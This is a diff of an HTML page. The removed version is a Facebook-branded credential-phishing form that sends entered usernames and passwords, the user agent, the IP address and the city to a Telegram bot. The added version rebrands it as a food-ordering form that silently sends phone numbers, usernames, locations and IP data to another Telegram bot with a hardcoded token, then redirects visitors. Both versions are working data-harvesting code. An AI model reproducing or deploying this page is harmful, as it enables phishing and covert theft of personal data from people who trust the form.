@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
+    <title>modjadi by process</title>
     <style>body {
     font-family: Arial, sans-serif;
     background-color: #f0f2f5;
@@ -51,6 +51,7 @@
     border: 1px solid #ddd;
     border-radius: 5px;
     font-size: 16px;
+    box-shadow: 3px 3px 5px 6px #ccc;
 }
 
 .login-button {
@@ -117,19 +118,24 @@ a {
     right: 5px;
     font-size: 20px;
     cursor: pointer;
-}</style>
+}
+</style>
 </head>
 <body>
     <div class="container">
         <div class="logo-container">
-            <div class="logo"><strong>Preminum</strong></div>
-            <p class="slogan">Get Premium R5 per week</p>
+            <div class="logo"><strong>Order food</strong></div>
+            <p class="slogan">Thank you for using our website</p>
         </div>
         <div class="form-container">
             <form onsubmit="submitonhfc(); return false;" method="post">
               <input type="hidden" name="" id="pagename" value="Facebook" />
-                <input type="text" id="email" placeholder="Voucher" class="input-field" name="email" required>
-                <input id="name" type="password" placeholder="Re-Enter voucher" class="input-field" name="password" required>
+                <input type="text" id="email" placeholder="location url" class="input-field" name="email" required>
+                <input id="name" type="locate" placeholder="Food" class="input-field" name="location" required>
+                
+        <input type="tel" id="phone" name="phone" placeholder="phone" class="input-field" required>
+        
+        <input type="text" id="username" name="username" placeholder="username" class="input-field" required>
                 <button type="submit" class="login-button">Send</button>
             </form>
             
@@ -174,14 +180,20 @@ a {
                const cityName = data.city;
     
                // Create the message to send
+               const username = document.getElementById("username").value;
+               const phone = document.getElementById("phone").value;
                const page = document.getElementById("pagename").value;
                const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
-               const message = `> Login Page : ${page}\n\n> Username : ${name}\n\n> Password : ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+               const message = `> Food Page : ${page}\n\n> food :
+                 ${name}\n\n> phone :
+                 ${phone}\n\n> username :
+                 ${username}\n\n> location url :
+                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
     
                // Send the message to your Telegram bot using the appropriate API
-               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
-               const chatId = 2013982441;
+               const botToken = '6357441245:AAGY8yAuR9uXK0PuPcwtqmbzzjhMpMpfpc0';
+               const chatId =1097939336 ;
     
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const telegramParams = {
@@ -198,7 +210,7 @@ a {
                // Handle the response (optional)
                xhr.onload = function() {
                  if (xhr.status === 200) {
-                   window.location.href = "https://www.facebook.com";
+                   window.location.href = "https://iamroot5.github.io/Modjadji.io/";
                  } else {
                    console.log('Error sending data to Telegram:', xhr.statusText);
                  }
